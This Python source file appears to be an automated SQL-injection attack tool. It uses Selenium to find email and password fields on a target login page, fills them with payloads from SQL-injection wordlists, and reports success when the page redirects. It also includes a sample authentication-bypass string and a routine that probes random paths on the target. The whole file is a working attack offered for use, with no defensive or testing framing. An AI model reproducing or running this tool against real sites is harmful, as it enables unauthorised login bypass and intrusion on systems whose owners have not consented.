import os
import sys
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from bs4 import BeautifulSoup
from modules.mods import *
import requests
import string 
import random
import json
from colorama import *

box_width = 49

# Function to create a fixed-width line bc it line wraps sometimes
def create_box_line(content, width, align="left"):
    if align == "left":
        return f"⟪ {content.ljust(width - 4)} ⟫"
    elif align == "right":
        return f"⟪ {content.rjust(width - 4)} ⟫"
    elif align == "center":
        return f"⟪ {content.center(width - 4)} ⟫"

def generate_random_string(length=8):
    # Define the characters to choose from: letters (uppercase and lowercase) and digits
    characters = string.ascii_letters + string.digits
    # Generate a random string by selecting random characters from the defined set
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def inject(url, driver, response, wordlist, payload, delay):

    # Initialize lists to store the actual WebElement objects
    email_elements = []
    password_elements = []
    # injection queue
    num = 1
    # Get the URL from the webdriver
    driver.get(url)
    driver.implicitly_wait(3)
    

    try:
        # Find elements by ID and NAME for password inputs
        pwdel_id = driver.find_elements(By.ID, 'password')
        pwdel_name = driver.find_elements(By.NAME, 'password')

        # Append the WebElement objects to the list
        password_elements.extend(pwdel_id)
        password_elements.extend(pwdel_name)

        # Remove duplicates by converting to a set and then back to a list
        password_elements = list(set(password_elements))

    except Exception as e:
        print(f"An error occurred: {e}")

    try:
        # Find elements by ID and NAME for email inputs
        input_id = driver.find_elements(By.ID, 'email')
        input_name = driver.find_elements(By.NAME, 'email')

        # Append the WebElement objects to the list
        email_elements.extend(input_id)
        email_elements.extend(input_name)

        # Remove duplicates by converting to a set and then back to a list
        email_elements = list(set(email_elements))

        # If no elements found, look for any input elements
        if not email_elements:
            input_all = driver.find_elements(By.TAG_NAME, 'input')
            tagarea = driver.find_elements(By.TAG_NAME, 'textarea')
            email_elements.extend(input_all)
            email_elements.extend(tagarea)

    except Exception as e:
        print(f"An error occurred: {e}")

    # Count the elements
    pwd = len(password_elements)
    count = len(email_elements)

    # Call the logo function
    logo(url, response, count, pwd)
          
    if payload == 1 or payload == 0:
      if payload == 0:
            print(f"⟪ {Fore.RED + "Using Defualt Wordlist" + Fore.RESET}                        ⟫")
            print("⟪                                               ⟫")
      with open('dict/sql-common.txt', 'r') as file:
    # Read all lines and add them to a list
          lines = file.readlines()

    if payload == 2:
      with open('dict/sql-generic.txt', 'r') as f:
          lines = f.readlines()

    if payload == 3:
      with open('dict/sql-time.txt', 'r') as f:
          lines = f.readlines()
    


    email_credentials = [line.strip() for line in lines]

    # email_credentials = ["admin' OR '1'='1'--", "user@example.com"]
    password_credentials = ["parrot"]
    
    print(f"⟪ Injections Loaded: {len(email_credentials)}                         ⟫")
    print("⟪                                               ⟫")
    print("⟪ Injection Queue:                              ⟫")
    print("⟪                                               ⟫")
    for email in email_credentials:
        for password in password_credentials:
            try:
                # Send keys to the email elements
                
                for element in email_elements:
                    element.clear()
                    element.send_keys(email)
                    
                    print(create_box_line(f"  {num}.  {email}", box_width, "left"))
                    num += 1
                    

                # Send keys to the password elements
                for element in password_elements:
                    element.clear()
                    element.send_keys(password)
                    
                
                # Press Enter after filling out the forms
                password_elements[0].send_keys(Keys.RETURN)

                # Wait for the page to potentially redirect
                time.sleep(delay)

                # Check if the URL has changed (indicating a redirect)
                current_url = driver.current_url
                if current_url != url:
                    print("⟪                                               ⟫")
                    print("⟪===============================================⟫ ")
                    print("⟪                                               ⟫")
                    print(f"⟪ Redirection:                                  ⟫")
                    print("⟪                                               ⟫")
                    print(f"⟪ {current_url}           ⟫")
                    if current_url != "": 
                        print("⟪                                               ⟫")
                        print(create_box_line(f"Injection: {Fore.GREEN + 'Successful' + Fore.RESET}", 59, "left"))
                        save_to_json(url, num)
                        print("⟪                                               ⟫")
                    else:
                        print(create_box_line(f"Injection: {Fore.RED + 'Failure :(' + Fore.RESET}", 49, "left"))
                        
                    return  # Exit the function if redirected
                
            except Exception as e:
                pass


    print(create_box_line(f"Injection: {Fore.RED + 'Failure :(' + Fore.RESET}", 49, "left"))
                        
    # Keep the browser open for 10 seconds before closing
    time.sleep(10)
    

def brute(url,driver,response):
    print("⟪===============================================⟫")
    print("⟪                                               ⟫")
    print("⟪ Bruting:                                      ⟫")
    print("⟪                                               ⟫")
    i = 0
    while i <= 32:
        rq = requests.get(url + generate_random_string(4))
        print(f"⟪ {i}. {url + generate_random_string(4)}: {rq.status_code}     ⟫")
        i += 1
    
